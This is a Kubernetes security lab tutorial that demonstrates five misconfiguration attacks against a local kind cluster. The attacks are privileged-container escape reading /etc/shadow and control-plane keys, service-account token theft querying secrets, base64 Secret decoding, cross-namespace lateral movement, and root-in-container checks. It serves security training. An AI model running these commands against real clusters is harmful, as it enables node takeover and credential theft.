# Lab 03: Attack Your Own Cluster

## Objective

Demonstrate five common Kubernetes attack vectors against your local kind cluster. Each attack shows what an adversary gains, the real-world impact, and the severity. These are the exact misconfigurations that appear in real breaches.

**Context**: This is authorized testing on your own local cluster. These techniques are used in pentesting engagements and CKS exam preparation.

---

## Setup

Ensure you have a clean cluster with no security policies applied:

```bash
kind delete cluster 2>/dev/null
kind create cluster
docker pull nginx:1.27 busybox redis:7 2>/dev/null
kind load docker-image nginx:1.27 busybox redis:7
```

Deploy a target application to attack:

```bash
kubectl create namespace target
kubectl -n target create deployment web --image=nginx:1.27 --replicas=2
kubectl -n target expose deployment web --port=80
kubectl -n target create secret generic db-creds \
  --from-literal=username=admin \
  --from-literal=password='S3cretP@ssw0rd!'
```

---

## Attack 1: Privileged Container Escape

**What it is**: A container running with `privileged: true` has full access to the host kernel. It can mount the host filesystem, load kernel modules, and escape the container entirely.

**Severity**: Critical

### Steps

```bash
kubectl apply -f manifests/attack-privileged-pod.yaml
kubectl wait --for=condition=Ready pod/privileged-attacker --timeout=30s
```

Once inside, mount the host filesystem:

```bash
kubectl exec -it privileged-attacker -- sh
# Inside the container:
mkdir -p /host
mount /dev/sda1 /host 2>/dev/null || mount /dev/vda1 /host 2>/dev/null
ls /host/etc/kubernetes/  # control plane certs and keys
cat /host/etc/shadow      # host user password hashes
exit
```

On kind, the device name varies. If neither works, list available devices:

```bash
kubectl exec privileged-attacker -- fdisk -l 2>/dev/null
```

**What the attacker gains**: Full root access to the underlying node. From there, they can pivot to other nodes, read all Secrets from the API server's etcd data, or install persistent backdoors.

**Real-world impact**: This is the most common container escape vector. The Tesla cryptojacking incident (2018) used a privileged container to mine cryptocurrency on the host.

### Clean up

```bash
kubectl delete pod privileged-attacker
```

---

## Attack 2: Service Account Token Theft

**What it is**: By default, every Pod gets a Kubernetes API token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. If the ServiceAccount has elevated permissions (or the default SA was granted extra roles), the token can be used to query or modify cluster resources.

**Severity**: High

### Steps

```bash
kubectl apply -f manifests/attack-sa-token-pod.yaml
kubectl wait --for=condition=Ready pod/sa-token-thief --timeout=30s
```

Read the token and query the API server:

```bash
kubectl exec sa-token-thief -- sh -c '
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
  APISERVER=https://kubernetes.default.svc

  echo "=== Token (first 50 chars) ==="
  echo $TOKEN | cut -c1-50

  echo ""
  echo "=== Attempting to list pods ==="
  wget -q --header="Authorization: Bearer $TOKEN" \
    --ca-certificate=$CACERT \
    -O - "$APISERVER/api/v1/namespaces/default/pods" 2>&1 | head -5

  echo ""
  echo "=== Attempting to list secrets ==="
  wget -q --header="Authorization: Bearer $TOKEN" \
    --ca-certificate=$CACERT \
    -O - "$APISERVER/api/v1/namespaces/default/secrets" 2>&1 | head -5
'
```

Even if the default ServiceAccount cannot list secrets, the token itself is a credential. In clusters where an admin has bound a ClusterRole to the default SA (common misconfiguration), this token provides full cluster access.

**What the attacker gains**: API access at the level of the ServiceAccount's RBAC permissions. At minimum, reconnaissance of the cluster. At worst, full admin access.

**Real-world impact**: The Shopify bug bounty ($25K) in 2020 involved leaked service account tokens that provided access to internal infrastructure.

### Clean up

```bash
kubectl delete pod sa-token-thief
```

---

## Attack 3: Exposed Secrets

**What it is**: Kubernetes Secrets are stored as base64-encoded values, not encrypted. Anyone with `get` access to Secrets can decode them trivially.

**Severity**: High

### Steps

```bash
# Read the secret we created in setup
kubectl -n target get secret db-creds -o yaml
```

The `data` field contains base64 values. Decode them:

```bash
kubectl -n target get secret db-creds -o jsonpath='{.data.username}' | base64 -d
echo ""
kubectl -n target get secret db-creds -o jsonpath='{.data.password}' | base64 -d
echo ""
```

Output:
```
admin
S3cretP@ssw0rd!
```

Check who can read Secrets in the cluster:

```bash
kubectl auth can-i get secrets --all-namespaces --as=system:serviceaccount:default:default
```

**What the attacker gains**: Database credentials, API keys, TLS certificates, any secret stored in the cluster. Base64 is encoding, not encryption.

**Real-world impact**: Secrets visible in etcd backups, in YAML exports, and to any user/SA with `get secrets` permission. Many clusters have overly broad RBAC that gives read access to secrets cluster-wide.

---

## Attack 4: No NetworkPolicy = Full Mesh

**What it is**: Without NetworkPolicies, every Pod can communicate with every other Pod across all namespaces. There is no network segmentation by default.

**Severity**: Medium-High

### Steps

Deploy an attacker Pod and probe the target namespace:

```bash
kubectl apply -f manifests/attack-no-netpol-pod.yaml
kubectl wait --for=condition=Ready pod/netpol-attacker --timeout=30s
```

Get the target service IP and probe it:

```bash
TARGET_IP=$(kubectl -n target get svc web -o jsonpath='{.spec.clusterIP}')
echo "Target Service IP: $TARGET_IP"

# Attack from default namespace reaching into target namespace
kubectl exec netpol-attacker -- wget -q -O - --timeout=3 http://$TARGET_IP
```

You should see the nginx welcome page. The attacker Pod in the `default` namespace reached a service in the `target` namespace with no restriction.

Scan for other services:

```bash
kubectl exec netpol-attacker -- sh -c "
  echo '=== DNS lookup of kubernetes service ==='
  nslookup kubernetes.default.svc.cluster.local 2>/dev/null || true

  echo ''
  echo '=== Reaching kube-dns ==='
  wget -q -O - --timeout=2 http://kube-dns.kube-system.svc.cluster.local:9153/metrics 2>&1 | head -3 || true
"
```

**What the attacker gains**: Lateral movement across namespaces. After compromising one Pod, the attacker can reach databases, internal APIs, and control-plane services.

**Real-world impact**: The majority of Kubernetes clusters have no NetworkPolicies. Any compromised workload becomes a pivot point to the entire cluster network.

### Clean up

```bash
kubectl delete pod netpol-attacker
```

---

## Attack 5: Running as Root

**What it is**: Containers run as root (UID 0) by default unless the image or Pod spec says otherwise. Root inside a container plus a kernel vulnerability equals container escape.

**Severity**: Medium

### Steps

```bash
kubectl apply -f manifests/attack-root-pod.yaml
kubectl wait --for=condition=Ready pod/root-pod --timeout=30s
```

Check the user and capabilities:

```bash
kubectl exec root-pod -- sh -c '
  echo "=== Current user ==="
  id

  echo ""
  echo "=== Can write to filesystem ==="
  touch /root/pwned && echo "Write successful: /root/pwned" || echo "Write blocked"

  echo ""
  echo "=== Processes ==="
  ps aux

  echo ""
  echo "=== Mounted filesystems ==="
  mount | head -10

  echo ""
  echo "=== /proc/1/status (container init) ==="
  head -5 /proc/1/status
'
```

You should see `uid=0(root)`, full write access, and a broad set of Linux capabilities.

**What the attacker gains**: Root inside the container means:
- Write access to the entire container filesystem (install tools, modify binaries)
- Ability to bind to privileged ports (< 1024)
- Combined with a kernel exploit (e.g., CVE-2022-0185, CVE-2024-1086), root UID enables container escape
- In privileged mode, root gets full host access

**Real-world impact**: Running as root is the default and the most commonly overlooked setting. The CrowdStrike 2024 Cloud Threat Report found that 64% of containers in production run as root.

### Clean up

```bash
kubectl delete pod root-pod
```

---

## Full Cleanup

```bash
kubectl delete namespace target
kubectl delete pod privileged-attacker sa-token-thief netpol-attacker root-pod 2>/dev/null
```

## AI Exercises

Ask your local LLM:
- "List the top 5 Kubernetes attack vectors from the MITRE ATT&CK Container Matrix"
- "Explain how CVE-2024-1086 can be used for container escape when running as root"
- "What is the difference between a privileged container and a container with CAP_SYS_ADMIN?"
- "How does an attacker pivot from a compromised Pod to the node in a real engagement?"

Cross-reference answers with the MITRE ATT&CK framework and your own observations from this lab.
